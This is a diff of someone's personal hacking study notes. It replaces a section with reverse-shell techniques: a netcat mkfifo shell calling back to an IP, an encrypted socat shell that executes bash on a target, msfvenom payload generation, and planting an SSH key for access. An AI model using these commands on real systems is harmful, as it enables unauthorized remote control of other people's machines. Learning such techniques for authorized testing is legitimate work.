@@ -81,9 +81,33 @@ Random notes I've made while learning about hacking that might prove useful in t
 - Note that if the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter.
 - Other way to upgrade a shell is to generate an SSH keypair with `ssh-keygen` and leave the public SSH key in ~/.ssh/authorized_keys and use the private key to login via SSH: `ssh -i id_rsa username@10.0.0.1`
 
-### Generate reverse shell command for Telnet with msfvenom
-- `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
-- result: `mkfifo /tmp/uxto; nc 10.9.222.201 4444 0</tmp/uxto | /bin/sh >/tmp/uxto 2>&1; rm /tmp/uxto`
+### Shell upgrade with rlwrap (useful for Windows targets)
+- `sudo apt install rlwrap`
+- `rlwrap nc -lvnp <port>`
+- Background: `Ctrl + Z`
+- `stty raw -echo; fg`
+
+### Shell with socat
+- see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+#### Encrypted Socat Reverse Shell with OpenSSL
+- generate RSA key on listening device: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+- `cat shell.key shell.crt > shell.pem`
+- open listener on own device: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0`
+- on target: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+
+### Change terminal tty size
+- on other terminal: `stty -a`
+- in shell: `stty rows <number>`
+- in shell: `stty cols <number>`
+
+### Generate reverse shell with msfvenom
+- `msfvenom -p <PAYLOAD> <OPTIONS>`
+- list payloads: `msfvenom --list payloads`
+- stageless: `windows/shell/reverse_tcp`
+- staged: `windows/shell_reverse_tcp`
+- ex; generate Windows x64 reverse shell in exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
+- ex; generate reverse netcat payload: `msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`
 
 ### Reverse Shell with command injection
 - on own pc: `sudo nc -lvnp 443`
